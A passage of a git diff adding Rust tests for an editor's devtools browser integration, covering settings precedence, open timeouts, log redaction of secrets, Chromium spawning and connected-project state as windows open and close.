diff --git a/crates/agent_ui/src/browser_channel_tests/devtools_browser_guards.rs b/crates/agent_ui/src/browser_channel_tests/devtools_browser_guards.rs
new file mode 100644
index 0000000..83c0be0
--- /dev/null
+++ b/crates/agent_ui/src/browser_channel_tests/devtools_browser_guards.rs
@@ -0,0 +1,386 @@
+// Story 055, task 13.1 — guards around `devtools: open in browser` beyond the pre-authored
+// `devtools_browser.rs` (design.md §B6-B7, Security Considerations; fix cycle 1). Wired INSIDE
+// `src/browser_channel.rs` (filter `cargo test -p agent_ui devtools_browser`):
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/devtools_browser_guards.rs"]
+//     mod devtools_browser_guards;
+//
+// Hostile halves:
+//   - `devtools.browser` and `devtools.browser_extension_path` are the user's only (deviation
+//     12.1). The keys share the project section with `devtools.dev_command`, so a project's
+//     `.zed/settings.json` can write them: a project file naming the system browser and an
+//     extension directory that really holds a manifest changes neither, while the same file's
+//     `dev_command` is read — proof the file was loaded and the keys were not merely missed;
+//   - one deadline (12.2): the open waits on the run `devtools: start` launched, so R1.6 shows
+//     once, from that run's timer, and the open ends with it; a second open after that timeout
+//     gets a full deadline of its own, not an instant cancel;
+//   - a start whose command cannot be resolved ends the open AT ONCE, with no R1.6 "did not
+//     connect" 60 s later for a server that never ran;
+//   - a Chromium that fails to spawn is logged with its root and a quoted error, never the URL;
+//     an extension directory without a manifest is logged, not silently dropped;
+//   - the Chromium command carries no `LD_LIBRARY_PATH` (an AppImage's bundled libraries).
+
+use std::ffi::OsStr;
+use std::path::{Path, PathBuf};
+use std::time::Duration;
+
+use gpui::{TestAppContext, UpdateGlobal as _};
+use serde_json::{Value, json};
+use settings::{Settings as _, SettingsLocation};
+use util::rel_path::RelPath;
+
+use super::logged_lines;
+use super::test_support::*;
+use crate::devtools_browser::{
+    BrowserTarget, CHROMIUM_NOT_FOUND, DevtoolsBrowserSettings, Launch, Opened, chromium_command,
+    execute, expand_home, spawn_detached, usable_extension,
+};
+use crate::devtools_run::DevtoolsSettings;
+
+const PANEL: &str = "http://localhost:5174";
+
+fn set_system_browser(cx: &mut TestAppContext) {
+    cx.update(|cx| {
+        settings::SettingsStore::update_global(cx, |store, cx| {
+            store
+                .set_user_settings(
+                    &json!({ "devtools": { "browser": "system" } }).to_string(),
+                    cx,
+                )
+                .expect("the devtools settings parse");
+        });
+    });
+}
+
+fn open_in_browser(win: &mut Win) {
+    win.workspace
+        .update_in(&mut win.cx, |workspace, window, cx| {
+            crate::devtools_browser::open_in_browser(workspace, None, window, cx)
+        });
+    win.cx.run_until_parked();
+}
+
+fn advance(win: &mut Win, seconds: u64) {
+    win.cx
+        .executor()
+        .advance_clock(Duration::from_secs(seconds));
+    win.cx.run_until_parked();
+}
+
+fn dev_hello(root: &str) -> Value {
+    json!({
+        "v": 2, "kind": "hello", "id": "h",
+        "client": {
+            "kind": "dev_server", "root": root,
+            "app_url": "http://localhost:5173", "panel_url": PANEL
+        }
+    })
+}
+
+/// How many logged lines start with `prefix` and contain `needle`.
+fn logged(prefix: &str, needle: &str) -> usize {
+    logged_lines()
+        .iter()
+        .filter(|line| line.starts_with(prefix) && line.contains(needle))
+        .count()
+}
+
+#[gpui::test]
+async fn hostile_a_project_file_cannot_choose_the_browser_or_the_extension(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let project_settings = json!({
+        "devtools": {
+            "browser": "system",
+            "browser_extension_path": "/q/app/ext",
+            "dev_command": "echo from-project",
+        }
+    });
+    fs.insert_tree(
+        "/q/app",
+        json!({
+            ".zed": { "settings.json": project_settings.to_string() },
+            "ext": { "manifest.json": "{}" },
+        }),
+    )
+    .await;
+    let win = window(&fs, "/q/app", None, cx).await;
+    win.cx.run_until_parked();
+    let worktree_id = win.workspace.read_with(&win.cx, |workspace, cx| {
+        workspace
+            .project()
+            .read(cx)
+            .visible_worktrees(cx)
+            .next()
+            .expect("the project's worktree")
+            .read(cx)
+            .id()
+    });
+
+    cx.update(|cx| {
+        let location = SettingsLocation {
+            worktree_id,
+            path: RelPath::empty(),
+        };
+        assert_eq!(
+            DevtoolsSettings::get(Some(location), cx)
+                .dev_command
+                .as_deref(),
+            Some("echo from-project"),
+            "the project file was loaded"
+        );
+        assert_eq!(
+            DevtoolsBrowserSettings::user(cx),
+            &DevtoolsBrowserSettings {
+                browser: BrowserTarget::Isolated,
+                extension_path: None,
+            },
+            "a project file chooses neither the browser nor the extension"
+        );
+    });
+}
+
+#[gpui::test]
+async fn the_user_settings_choose_the_browser_and_the_extension(cx: &mut TestAppContext) {
+    init(cx);
+    cx.update(|cx| {
+        assert_eq!(
+            DevtoolsBrowserSettings::user(cx).browser,
+            BrowserTarget::Isolated,
+            "R4.3: isolated is the default"
+        );
+        settings::SettingsStore::update_global(cx, |store, cx| {
+            store
+                .set_user_settings(
+                    &json!({
+                        "devtools": { "browser": "system", "browser_extension_path": "/ext" }
+                    })
+                    .to_string(),
+                    cx,
+                )
+                .expect("the devtools settings parse");
+        });
+        assert_eq!(
+            DevtoolsBrowserSettings::user(cx),
+            &DevtoolsBrowserSettings {
+                browser: BrowserTarget::System,
+                extension_path: Some(PathBuf::from("/ext")),
+            }
+        );
+    });
+}
+
+#[gpui::test]
+async fn hostile_one_deadline_governs_the_open_and_r1_6_shows_once(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    fs.insert_tree(
+        "/r/app",
+        json!({ "package.json": json!({ "scripts": { "dev": "vite" } }).to_string() }),
+    )
+    .await;
+    let mut win = window(&fs, "/r/app", None, cx).await;
+    set_system_browser(cx);
+    let before = win.notifications();
+    open_in_browser(&mut win);
+    advance(&mut win, 61);
+
+    assert_eq!(
+        logged("devtools_run event=not_announced", ""),
+        1,
+        "one timer, the run's own: {:#?}",
+        logged_lines()
+    );
+    assert_eq!(
+        logged("devtools_browser event=cancelled", "reason=not_announced"),
+        1,
+        "the open ended with it"
+    );
+    assert_eq!(win.notifications(), before + 1, "R1.6's message, once");
+    assert!(cx.opened_url().is_none(), "R4.7: no browser");
+
+    // The server still runs, silent: a second open waits a full deadline again.
+    open_in_browser(&mut win);
+    advance(&mut win, 59);
+    assert_eq!(
+        logged("devtools_browser event=cancelled", "reason=not_announced"),
+        1,
+        "not cancelled at once by the earlier timeout"
+    );
+    advance(&mut win, 2);
+    assert_eq!(
+        logged("devtools_browser event=cancelled", "reason=not_announced"),
+        2
+    );
+    assert_eq!(win.notifications(), before + 1, "still one R1.6 notice");
+    assert!(cx.opened_url().is_none());
+}
+
+#[gpui::test]
+async fn hostile_a_start_that_cannot_resolve_ends_the_open_at_once_without_r1_6(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    // `/p/app` holds no package.json: there is no dev script to run.
+    let mut win = window(&fs, "/p/app", None, cx).await;
+    set_system_browser(cx);
+    let before = win.notifications();
+    open_in_browser(&mut win);
+
+    assert_eq!(
+        logged("devtools_browser event=cancelled", "reason=run_ended"),
+        1,
+        "the wait ends promptly: {:#?}",
+        logged_lines()
+    );
+    let after_start = win.notifications();
+    assert_eq!(after_start, before + 1, "only R1.4's \"no dev script\"");
+
+    advance(&mut win, 61);
+    assert_eq!(
+        win.notifications(),
+        after_start,
+        "no R1.6 for a server that never ran"
+    );
+    assert_eq!(logged("devtools_run event=not_announced", ""), 0);
+
+    let late = open_session(1);
+    late.handle(dev_hello("/p/app"), &win.app_state(), cx);
+    win.cx.run_until_parked();
+    assert!(cx.opened_url().is_none(), "the cancelled open never fires");
+}
+
+#[test]
+fn hostile_a_chromium_that_fails_to_spawn_is_logged_without_the_url() {
+    let url = format!("{PANEL}/?secret=1#thread=t-1");
+    let launch = Launch::Chromium {
+        program: PathBuf::from("/nonexistent/zeo-test/chromium"),
+        args: vec![format!("--app={url}")],
+    };
+    let opened = execute(Path::new("/p/app"), &url, launch);
+    assert_eq!(
+        opened,
+        Opened::Default {
+            url,
+            notice: Some(CHROMIUM_NOT_FOUND.to_string()),
+        },
+        "R4.4: the default browser, with the notice"
+    );
+    let lines = logged_lines();
+    let line = lines
+        .iter()
+        .find(|line| line.starts_with("devtools_browser event=chromium_spawn_failed"))
+        .unwrap_or_else(|| panic!("the failure is logged: {lines:#?}"));
+    assert!(line.contains(" root=/p/app "), "{line}");
+    assert!(
+        line.contains(r#"program="/nonexistent/zeo-test/chromium""#),
+        "{line}"
+    );
+    assert!(
+        line.contains(" error=\""),
+        "the error is a quoted value: {line}"
+    );
+    assert!(!line.contains("secret"), "never the URL: {line}");
+}
+
+#[test]
+fn hostile_an_extension_without_a_manifest_is_logged_and_skipped() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let empty = dir.path().join("empty ext");
+    std::fs::create_dir(&empty).expect("mkdir");
+    assert_eq!(usable_extension(Path::new("/p/app"), Some(&empty)), None);
+    let lines = logged_lines();
+    let line = lines
+        .iter()
+        .find(|line| line.starts_with("devtools_browser event=extension_skipped"))
+        .unwrap_or_else(|| panic!("the skip is logged: {lines:#?}"));
+    assert!(line.contains(" root=/p/app "), "{line}");
+    assert!(line.contains(" reason=no_manifest "), "{line}");
+    assert!(
+        line.contains(&format!("path={:?}", empty.display().to_string())),
+        "the path, quoted: {line}"
+    );
+
+    let real = dir.path().join("ext");
+    std::fs::create_dir(&real).expect("mkdir");
+    std::fs::write(real.join("manifest.json"), "{}").expect("write");
+    assert_eq!(
+        usable_extension(Path::new("/p/app"), Some(&real)),
+        Some(real.clone())
+    );
+    assert_eq!(usable_extension(Path::new("/p/app"), None), None);
+}
+
+#[test]
+fn a_leading_tilde_is_the_home_directory() {
+    let home = Path::new("/home/op");
+    assert_eq!(
+        expand_home(Path::new("~/zeo-browser/dist"), home),
+        PathBuf::from("/home/op/zeo-browser/dist")
+    );
+    assert_eq!(
+        expand_home(Path::new("/opt/ext"), home),
+        PathBuf::from("/opt/ext")
+    );
+    assert_eq!(
+        expand_home(Path::new("~other/ext"), home),
+        PathBuf::from("~other/ext"),
+        "another user's home is not guessed"
+    );
+}
+
+#[test]
+fn hostile_the_chromium_command_drops_ld_library_path() {
+    let command = chromium_command(
+        Path::new("/usr/bin/chromium"),
+        &["--no-first-run".to_string()],
+    );
+    assert!(
+        command
+            .get_envs()
+            .any(|(key, value)| key == OsStr::new("LD_LIBRARY_PATH") && value.is_none()),
+        "removed from the child's environment, whatever Zeo's holds"
+    );
+    assert_eq!(
+        command.get_args().collect::<Vec<_>>(),
+        vec![OsStr::new("--no-first-run")]
+    );
+}
+
+/// The spawned process itself: its three streams are `/dev/null` (async-process resets them to
+/// inherited unless they are set after converting the std command) and it leads a process group
+/// of its own.
+#[cfg(target_os = "linux")]
+#[test]
+fn hostile_the_spawned_browser_has_no_streams_of_zeo_and_its_own_process_group() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let report = dir.path().join("report");
+    // The shell's own descriptors, read before any redirection of its own.
+    let script = r#"input=$(readlink /proc/$$/fd/0); out=$(readlink /proc/$$/fd/1); err=$(readlink /proc/$$/fd/2); pgid=$(cut -d' ' -f5 /proc/$$/stat); printf '%s\n' "$input" "$out" "$err" "$$" "$pgid" > "$1.tmp" && mv "$1.tmp" "$1""#;
+    spawn_detached(
+        Path::new("/bin/sh"),
+        &[
+            "-c".to_string(),
+            script.to_string(),
+            "sh".to_string(),
+            report.display().to_string(),
+        ],
+    )
+    .expect("spawn /bin/sh");
+    let deadline = std::time::Instant::now() + Duration::from_secs(10);
+    while !report.exists() && std::time::Instant::now() < deadline {
+        std::thread::sleep(Duration::from_millis(20));
+    }
+    let report = std::fs::read_to_string(&report).expect("the child wrote its report");
+    let lines: Vec<&str> = report.lines().map(str::trim).collect();
+    assert_eq!(
+        lines.get(..3),
+        Some(&["/dev/null", "/dev/null", "/dev/null"][..]),
+        "{report}"
+    );
+    assert_eq!(lines.get(3), lines.get(4), "pid == pgid: {report}");
+}
diff --git a/crates/agent_ui/src/browser_channel_tests/devtools_logs.rs b/crates/agent_ui/src/browser_channel_tests/devtools_logs.rs
new file mode 100644
index 0000000..d8c4005
--- /dev/null
+++ b/crates/agent_ui/src/browser_channel_tests/devtools_logs.rs
@@ -0,0 +1,227 @@
+// Story 055, tasks 9.1 and 11.1 — Zeo's log lines for panel sessions (design.md §B4 "Logs").
+// Requirements: R9.1, R9.2 (Q15). Wired INSIDE `src/browser_channel.rs` beside 045's modules:
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/devtools_logs.rs"]
+//     mod devtools_logs;
+//
+// Filter: `cargo test -p agent_ui browser_channel::devtools_logs` (also run by 11.1's
+// `cargo test -p agent_ui browser_channel`).
+//
+// Log capture: story 031's thread-local capture in `thread_organization::test_helpers`
+// (`capture_logs`, `all_lines_lowercased`). A test binary can install ONE process-wide logger, so a
+// second capture here would make one of the two suites panic; materializing this file therefore
+// widens that module and those two functions from `pub(super)` to `pub(crate)` (test support only,
+// no production change).
+//
+// What a "devtools line" is: any captured line naming the project root (`root=/p/app`). Lines are
+// compared lowercased (the capture's form); roots and thread ids in these tests are lowercase.
+//
+// Hostile halves first:
+//   - R9.2: the text the operator sends and a secret in an attached page URL's QUERY never appear
+//     in any line, at any level — while the send itself IS logged with its thread id (so the
+//     absence is not just a missing line);
+//   - every devtools line is key=value after its `event=` token — a line that logs a value with an
+//     unquoted space breaks every parser downstream (Q15).
+
+use acp_thread::StubAgentConnection;
+use gpui::TestAppContext;
+use serde_json::{Value, json};
+
+use super::test_support::*;
+use crate::thread_organization::test_helpers::{all_lines_lowercased, capture_logs};
+
+const SECRET_TEXT: &str = "secret-prompt-5d1e";
+const SECRET_QUERY: &str = "token=secret-query-7c1";
+
+fn dev_hello(root: &str) -> Value {
+    json!({
+        "v": 2, "kind": "hello", "id": "h",
+        "client": {
+            "kind": "dev_server", "root": root,
+            "app_url": "http://localhost:5173/", "panel_url": "http://localhost:5174/"
+        }
+    })
+}
+
+fn panel_hello(root: &str) -> Value {
+    json!({ "v": 2, "kind": "hello", "id": "h", "client": { "kind": "panel", "root": root } })
+}
+
+fn element(page_url: &str) -> Value {
+    json!({
+        "type": "element",
+        "page_url": page_url,
+        "selector": "#save",
+        "html": "<button id=\"save\">Save</button>",
+        "dom": {
+            "tag": "button", "id": "save", "classes": [], "text": "Save",
+            "attrs": {}, "styles": {}, "rect": { "x": 0, "y": 0, "w": 10, "h": 10 }
+        }
+    })
+}
+
+fn devtools_lines() -> Vec<String> {
+    all_lines_lowercased()
+        .into_iter()
+        .filter(|line| line.contains("root=/p/app"))
+        .collect()
+}
+
+/// The tokens after `event=` must all be `key=value`, a value either bare (no space) or quoted.
+fn assert_key_values(line: &str) {
+    let start = line
+        .find("event=")
+        .unwrap_or_else(|| panic!("a devtools line names its event: {line}"));
+    let mut rest = &line[start..];
+    while !rest.is_empty() {
+        rest = rest.trim_start();
+        if rest.is_empty() {
+            break;
+        }
+        let eq = rest
+            .find('=')
+            .unwrap_or_else(|| panic!("not key=value at {rest:?} in {line}"));
+        let key = &rest[..eq];
+        assert!(
+            !key.is_empty() && key.chars().all(|c| c.is_ascii_lowercase() || c == '_'),
+            "bad key {key:?} in {line}"
+        );
+        let value = &rest[eq + 1..];
+        if let Some(quoted) = value.strip_prefix('"') {
+            let end = quoted
+                .find('"')
+                .unwrap_or_else(|| panic!("unterminated quote in {line}"));
+            rest = &quoted[end + 1..];
+        } else {
+            let end = value.find(' ').unwrap_or(value.len());
+            assert!(end > 0, "empty value for {key} in {line}");
+            rest = &value[end..];
+        }
+    }
+}
+
+fn reply(msgs: &[Value], id: &str) -> Value {
+    msgs.iter()
+        .find(|m| m["id"] == id)
+        .cloned()
+        .unwrap_or_else(|| panic!("no reply to {id}: {msgs:?}"))
+}
+
+#[gpui::test]
+async fn hostile_a_send_is_logged_with_its_thread_but_never_its_text_or_url_query(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    capture_logs();
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let announce = open_session(1);
+    announce.handle(dev_hello("/p/app"), &app.app_state(), cx);
+    let panel = open_session(2);
+    panel.handle(panel_hello("/p/app"), &app.app_state(), cx);
+    panel.drain(cx);
+    panel.handle(
+        request("create_thread", "c", json!({})),
+        &app.app_state(),
+        cx,
+    );
+    let created = reply(&panel.drain(cx), "c");
+    let thread = created["thread"]["thread_id"]
+        .as_str()
+        .expect("created")
+        .to_lowercase();
+    panel.handle(
+        request(
+            "subscribe",
+            "s",
+            json!({ "target": { "thread_id": thread } }),
+        ),
+        &app.app_state(),
+        cx,
+    );
+    panel.drain(cx);
+    panel.handle(
+        request(
+            "send",
+            "m",
+            json!({
+                "text": SECRET_TEXT,
+                "attachments": [element(&format!("http://localhost:5173/page?{SECRET_QUERY}"))]
+            }),
+        ),
+        &app.app_state(),
+        cx,
+    );
+    panel.drain(cx);
+
+    let all = all_lines_lowercased();
+    for line in &all {
+        assert!(
+            !line.contains(SECRET_TEXT),
+            "R9.2: message text logged: {line}"
+        );
+        assert!(
+            !line.contains(SECRET_QUERY),
+            "R9.2: URL query logged: {line}"
+        );
+    }
+    let lines = devtools_lines();
+    assert!(
+        lines
+            .iter()
+            .any(|l| l.contains(&thread) && (l.contains("event=panel_send") || l.contains("send"))),
+        "R9.1: the send is logged with its thread id: {lines:#?}"
+    );
+    assert!(
+        lines
+            .iter()
+            .any(|l| l.contains(&thread) && l.contains("create")),
+        "R9.1: the create is logged with its thread id: {lines:#?}"
+    );
+}
+
+#[gpui::test]
+async fn panel_session_open_close_and_refusal_are_logged_with_the_root_as_key_values(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    capture_logs();
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let panel = open_session(7);
+    panel.handle(panel_hello("/p/app"), &app.app_state(), cx);
+    panel.drain(cx);
+    let opened = devtools_lines().len();
+    assert!(
+        opened >= 1,
+        "R9.1: the panel session opening is logged with its root"
+    );
+
+    panel.handle(
+        request(
+            "subscribe",
+            "s",
+            json!({ "target": { "thread_id": "00000000-0000-0000-0000-000000000000" } }),
+        ),
+        &app.app_state(),
+        cx,
+    );
+    assert_eq!(reply(&panel.drain(cx), "s")["error"], "not_found");
+    let after_refusal = devtools_lines().len();
+    assert!(
+        after_refusal > opened,
+        "R9.1: the refusal is logged with the root"
+    );
+
+    cx.update(|cx| super::close_session(panel.id.clone(), cx));
+    cx.run_until_parked();
+    assert!(
+        devtools_lines().len() > after_refusal,
+        "R9.1: the close is logged with the root"
+    );
+
+    for line in devtools_lines() {
+        assert_key_values(&line);
+    }
+}
diff --git a/crates/agent_ui/src/browser_channel_tests/devtools_projects.rs b/crates/agent_ui/src/browser_channel_tests/devtools_projects.rs
new file mode 100644
index 0000000..77196a1
--- /dev/null
+++ b/crates/agent_ui/src/browser_channel_tests/devtools_projects.rs
@@ -0,0 +1,383 @@
+// Story 055, task 9.1 — connected projects, panel-hello admission and the open state
+// (design.md §B2, Assumptions A1, A4). Requirements: R2.2, R2.3, R2.4, R7.1, R7.3, R7.6 (Q4, Q5).
+// R9.1-R9.2 (Zeo's log lines) are proved in `devtools_logs.rs`. Wired INSIDE `src/browser_channel.rs`
+// beside 045's modules, so it reuses `test_support` and its path matches the Validation filter
+// `cargo test -p agent_ui devtools_projects`:
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/devtools_projects.rs"]
+//     mod devtools_projects;
+//
+// Driven the way the bridge drives it: `hello` messages through `handle_session_message`, session
+// ends through `close_session`, windows opened and closed with 045's `window()` harness.
+// Seams (design.md §B2 Interface), each named in ONE helper below: `connected()` reads
+// `DevtoolsProjects::global(cx).read(cx).project_for(&Path)` (`app_url`, `panel_url`, `open`);
+// `is_open()` reads `is_open(&Path)`; `announced()` subscribes to
+// `DevtoolsProjectsEvent::Announced(root)`. A panel hello is admitted HERE (task 9.1), with no
+// approval prompt, answered `welcome` then the current state.
+//
+// Hostile halves first:
+//   - "inside a worktree" is a path rule, not a string prefix: `/p/app-other` is NOT inside the
+//     open `/p/app` (wrongly collapsed by `starts_with` on strings), while `/p/app/sub` IS
+//     (wrongly split by an exact-match rule);
+//   - one dev server per root (A4) in both directions: two different roots stay two entries, and
+//     the same root spelled `/p/app/` replaces `/p/app` — ending the older session;
+//   - the last window: closing ONE of two windows on the root sends nothing; closing the last sends
+//     `project_closed` to the announce AND the panel session of that root, and to no session of
+//     another root;
+//   - R7.6, the state a panel hello gets comes from the WORKTREES, never from the announce: an open
+//     root with NO announce answers `project_open` (wrongly closed if read from the registry),
+//     and an announced root with no open window answers `project_closed` (wrongly open if read
+//     from the announce);
+//   - quitting Zeo closes every root at once (R7.1), not only the one a window event names.
+
+use std::cell::RefCell;
+use std::path::{Path, PathBuf};
+use std::rc::Rc;
+
+use gpui::TestAppContext;
+use serde_json::{Value, json};
+
+use super::close_session;
+use super::test_support::*;
+
+fn dev_hello(root: &str, port: u16) -> Value {
+    json!({
+        "v": 2,
+        "kind": "hello",
+        "id": "h",
+        "client": {
+            "kind": "dev_server",
+            "root": root,
+            "app_url": format!("http://localhost:{port}"),
+            "panel_url": format!("http://localhost:{}", port + 1)
+        }
+    })
+}
+
+fn panel_hello(root: &str) -> Value {
+    json!({ "v": 2, "kind": "hello", "id": "h", "client": { "kind": "panel", "root": root } })
+}
+
+/// (app_url, panel_url, open) of the connected project at `root`, if any. The one seam line.
+fn connected(root: &str, cx: &mut TestAppContext) -> Option<(String, String, bool)> {
+    cx.update(|cx| {
+        crate::devtools_projects::DevtoolsProjects::global(cx)
+            .read(cx)
+            .project_for(Path::new(root))
+            .map(|p| (p.app_url.to_string(), p.panel_url.to_string(), p.open))
+    })
+}
+
+fn is_open(root: &str, cx: &mut TestAppContext) -> bool {
+    cx.update(|cx| {
+        crate::devtools_projects::DevtoolsProjects::global(cx)
+            .read(cx)
+            .is_open(Path::new(root))
+    })
+}
+
+/// Every root `Announced` names from now on.
+fn announced(cx: &mut TestAppContext) -> Rc<RefCell<Vec<PathBuf>>> {
+    let seen = Rc::new(RefCell::new(Vec::new()));
+    let sink = seen.clone();
+    cx.update(|cx| {
+        let projects = crate::devtools_projects::DevtoolsProjects::global(cx);
+        cx.subscribe(&projects, move |_, event, _| {
+            #[allow(irrefutable_let_patterns)]
+            if let crate::devtools_projects::DevtoolsProjectsEvent::Announced(root) = event {
+                sink.borrow_mut().push(root.clone());
+            }
+        })
+        .detach();
+    });
+    seen
+}
+
+fn has(msgs: &[Value], kind: &str) -> bool {
+    msgs.iter().any(|m| m["kind"] == kind)
+}
+
+#[gpui::test]
+async fn hostile_a_sibling_whose_name_extends_the_open_root_is_not_open(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let win = window(&fs, "/p/app", None, cx).await;
+    let announce = open_session(1);
+    announce.handle(dev_hello("/p/app-other", 5173), &win.app_state(), cx);
+    let (_, _, open) = connected("/p/app-other", cx).expect("recorded even when not open (R2.3)");
+    assert!(!open, "/p/app-other does not lie inside /p/app");
+    let got = announce.drain(cx);
+    assert!(
+        has(&got, "project_closed"),
+        "R2.3: told it is closed: {got:?}"
+    );
+    assert!(!announce.closed(), "R2.3: the session is kept");
+}
+
+#[gpui::test]
+async fn a_root_inside_an_open_worktree_is_open(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let win = window(&fs, "/p/app", None, cx).await;
+    let announce = open_session(1);
+    announce.handle(dev_hello("/p/app/sub", 5173), &win.app_state(), cx);
+    let (app_url, panel_url, open) = connected("/p/app/sub", cx).expect("connected (R2.2)");
+    assert!(open);
+    assert_eq!(app_url, "http://localhost:5173");
+    assert_eq!(panel_url, "http://localhost:5174");
+    assert!(!has(&announce.drain(cx), "project_closed"));
+}
+
+#[gpui::test]
+async fn hostile_two_roots_stay_two_entries(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let win = window(&fs, "/p/app", None, cx).await;
+    let _web = window(&fs, "/p/web", None, cx).await;
+    let app = open_session(1);
+    let web = open_session(2);
+    app.handle(dev_hello("/p/app", 5173), &win.app_state(), cx);
+    web.handle(dev_hello("/p/web", 6173), &win.app_state(), cx);
+    assert!(
+        !app.closed(),
+        "a second root must not end the first root's session"
+    );
+    assert_eq!(
+        connected("/p/app", cx).map(|c| c.0),
+        Some("http://localhost:5173".into())
+    );
+    assert_eq!(
+        connected("/p/web", cx).map(|c| c.0),
+        Some("http://localhost:6173".into())
+    );
+}
+
+#[gpui::test]
+async fn hostile_the_same_root_spelled_differently_replaces_the_older_session(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let win = window(&fs, "/p/app", None, cx).await;
+    let older = open_session(1);
+    let newer = open_session(2);
+    older.handle(dev_hello("/p/app", 5173), &win.app_state(), cx);
+    newer.handle(dev_hello("/p/app/", 7173), &win.app_state(), cx);
+    assert!(
+        older.closed(),
+        "A4: the newer announce ends the older session"
+    );
+    assert!(!newer.closed());
+    assert_eq!(
+        connected("/p/app", cx).map(|c| c.0),
+        Some("http://localhost:7173".into())
+    );
+}
+
+#[gpui::test]
+async fn the_announcing_session_ending_removes_the_project(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let win = window(&fs, "/p/app", None, cx).await;
+    let announce = open_session(1);
+    announce.handle(dev_hello("/p/app", 5173), &win.app_state(), cx);
+    assert!(connected("/p/app", cx).is_some());
+    cx.update(|cx| close_session(announce.id.clone(), cx));
+    cx.run_until_parked();
+    assert!(connected("/p/app", cx).is_none(), "R2.4");
+}
+
+#[gpui::test]
+async fn hostile_a_replaced_session_ending_late_does_not_remove_its_successor(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let win = window(&fs, "/p/app", None, cx).await;
+    let older = open_session(1);
+    let newer = open_session(2);
+    older.handle(dev_hello("/p/app", 5173), &win.app_state(), cx);
+    newer.handle(dev_hello("/p/app", 7173), &win.app_state(), cx);
+    cx.update(|cx| close_session(older.id.clone(), cx));
+    cx.run_until_parked();
+    assert_eq!(
+        connected("/p/app", cx).map(|c| c.0),
+        Some("http://localhost:7173".into()),
+        "the end of the replaced session must not drop the current one"
+    );
+}
+
+#[gpui::test]
+async fn hostile_closing_one_of_two_windows_sends_nothing_closing_the_last_sends_closed(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let mut first = window(&fs, "/p/app", None, cx).await;
+    let mut second = window(&fs, "/p/app", None, cx).await;
+    let _web = window(&fs, "/p/web", None, cx).await;
+    let announce = open_session(1);
+    let panel = open_session(2);
+    let other_root_panel = open_session(3);
+    let app_state = first.app_state();
+    announce.handle(dev_hello("/p/app", 5173), &app_state, cx);
+    panel.handle(panel_hello("/p/app"), &app_state, cx);
+    let web_announce = open_session(4);
+    web_announce.handle(dev_hello("/p/web", 6173), &app_state, cx);
+    other_root_panel.handle(panel_hello("/p/web"), &app_state, cx);
+    announce.drain(cx);
+    panel.drain(cx);
+    other_root_panel.drain(cx);
+
+    first.cx.update(|window, _| window.remove_window());
+    first.cx.run_until_parked();
+    assert!(
+        !has(&announce.drain(cx), "project_closed"),
+        "a window still holds /p/app"
+    );
+    assert!(!has(&panel.drain(cx), "project_closed"));
+    assert_eq!(connected("/p/app", cx).map(|c| c.2), Some(true));
+
+    second.cx.update(|window, _| window.remove_window());
+    second.cx.run_until_parked();
+    assert!(
+        has(&announce.drain(cx), "project_closed"),
+        "R7.1: the announce session"
+    );
+    assert!(
+        has(&panel.drain(cx), "project_closed"),
+        "R7.1: the panel session"
+    );
+    assert!(
+        !has(&other_root_panel.drain(cx), "project_closed"),
+        "another root's panel is untouched"
+    );
+    assert_eq!(connected("/p/app", cx).map(|c| c.2), Some(false));
+}
+
+#[gpui::test]
+async fn reopening_the_project_sends_project_open(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let mut win = window(&fs, "/p/app", None, cx).await;
+    let app_state = win.app_state();
+    let announce = open_session(1);
+    let panel = open_session(2);
+    announce.handle(dev_hello("/p/app", 5173), &app_state, cx);
+    panel.handle(panel_hello("/p/app"), &app_state, cx);
+    win.cx.update(|window, _| window.remove_window());
+    win.cx.run_until_parked();
+    announce.drain(cx);
+    panel.drain(cx);
+
+    let _again = window(&fs, "/p/app", None, cx).await;
+    assert!(
+        has(&announce.drain(cx), "project_open"),
+        "R7.3: the announce session"
+    );
+    assert!(
+        has(&panel.drain(cx), "project_open"),
+        "R7.3: the panel session"
+    );
+    assert_eq!(connected("/p/app", cx).map(|c| c.2), Some(true));
+}
+
+#[gpui::test]
+async fn hostile_a_panel_hello_gets_the_state_of_the_worktrees_not_of_the_announce(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let win = window(&fs, "/p/app", None, cx).await;
+    let app_state = win.app_state();
+
+    // Open in Zeo, no dev server announced: still project_open.
+    let panel = open_session(1);
+    panel.handle(panel_hello("/p/app"), &app_state, cx);
+    assert_eq!(
+        kinds(&panel.drain(cx)),
+        vec!["welcome".to_string(), "project_open".to_string()],
+        "R7.6: admitted without approval, then the current state"
+    );
+    assert!(
+        connected("/p/app", cx).is_none(),
+        "no announce entry was needed"
+    );
+    assert!(is_open("/p/app", cx));
+
+    // Announced, but no window holds the root: project_closed.
+    let announce = open_session(2);
+    announce.handle(dev_hello("/p/web", 6173), &app_state, cx);
+    let late_panel = open_session(3);
+    late_panel.handle(panel_hello("/p/web"), &app_state, cx);
+    assert_eq!(
+        kinds(&late_panel.drain(cx)),
